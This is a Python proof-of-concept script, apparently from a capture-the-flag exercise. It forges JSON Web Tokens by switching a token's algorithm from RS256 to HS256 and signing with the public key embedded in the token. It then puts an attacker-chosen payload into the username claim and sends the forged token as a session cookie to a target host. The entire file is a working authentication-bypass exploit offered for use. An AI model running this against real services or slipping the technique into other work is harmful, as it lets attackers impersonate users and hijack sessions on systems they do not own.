import jwt, base64, ast, math, hmac, hashlib, binascii, json, sys, requests

def gen_token(token, payload):
    # token = "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImR1Y2t5IiwicGsiOiItLS0tLUJFR0lOIFBVQkxJQyBLRVktLS0tLVxuTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUE5NW9UbTlETnpjSHI4Z0xoalphWVxua3RzYmoxS3h4VU9vencwdHJQOTNCZ0lwWHY2V2lwUVJCNWxxb2ZQbFU2RkI5OUpjNVFaMDQ1OXQ3M2dnVkRRaVxuWHVDTUkyaG9VZkoxVm1qTmVXQ3JTckRVaG9rSUZaRXVDdW1laHd3dFVOdUV2MGV6QzU0WlRkRUM1WVNUQU96Z1xuaklXYWxzSGovZ2E1WkVEeDNFeHQwTWg1QUV3YkFENzMrcVhTL3VDdmhmYWpncHpIR2Q5T2dOUVU2MExNZjJtSFxuK0Z5bk5zak5Od281blJlN3RSMTJXYjJZT0N4dzJ2ZGFtTzFuMWtmL1NNeXBTS0t2T2dqNXkwTEdpVTNqZVhNeFxuVjhXUytZaVlDVTVPQkFtVGN6Mncya3pCaFpGbEg2Uks0bXF1ZXhKSHJhMjNJR3Y1VUo1R1ZQRVhwZENxSzNUclxuMHdJREFRQUJcbi0tLS0tRU5EIFBVQkxJQyBLRVktLS0tLVxuIiwiaWF0IjoxNjQzNzEwNzA4fQ.uEjkCwowbEO7meludsOgLt_WwZUm-BRwJiBXKlMgfexOhupqJYtNAE3dAcj989zDSo-PgiX77YuP3CW3M2L34BUrJWDcjdjdadccysUDTgG1EpEx0kpDk95BhhIMUUx99FYLntmMnGhZeKGNXt7OkPYYRIL1snCeIx79JJTur0Tc7jRqq1O0Ov1qsP4s0vnI_aJEtBMBA1Y639unpbZCkDG5RQgcNFcntMs0Oqak9gH6gC7B1CHLPZZ9TbQZJJ28ewRdRngY8NCZ_D2ZOGIjJGmKoIRIqWpf-MPG1PmuwpxIvZYFlVhgcypmW2eIiHHsSzMvHIdLTNgtQs8qDyZMiA"
    header = ast.literal_eval(base64.b64decode(token.split(".")[0]).decode("UTF-8"))
    header['alg'] = "HS256"
    data = ast.literal_eval(base64.b64decode(token.split(".")[1].ljust((int)(math.ceil(len(token.split(".")[1]) / 4)) * 4, '=')).decode("UTF-8"))
    data['username'] = payload

    public_key = data['pk'].encode("UTF-8")

    header = base64.urlsafe_b64encode(json.dumps(header).encode('utf-8')).decode().strip('=')
    data = base64.urlsafe_b64encode(json.dumps(data).encode('utf-8')).decode().strip('=')

    jwt_header_data = header + "." + data

    mess = jwt_header_data.encode("UTF-8")
    signature = hmac.new(public_key, mess, hashlib.sha256).hexdigest()

    sign = str(base64.urlsafe_b64encode(binascii.a2b_hex(signature))).replace('=','')
    sign = sign.split("'")[1]
    return jwt_header_data + "." + sign

def main():
    try:
        if sys.argv[1] == None or sys.argv[2] == None or sys.argv[3] == None:
            exit()
        else:
            token_new = gen_token(sys.argv[1], sys.argv[3])
            rq = requests.get(sys.argv[2], cookies= {"session": str(token_new)}, allow_redirects=False)
            rp = rq.content
            print(str(rp)[1778:int(str(rp).index('<br>'))])
    except:
        print("Uses: PoC.py <token> <host> <payload>")
        exit()

main()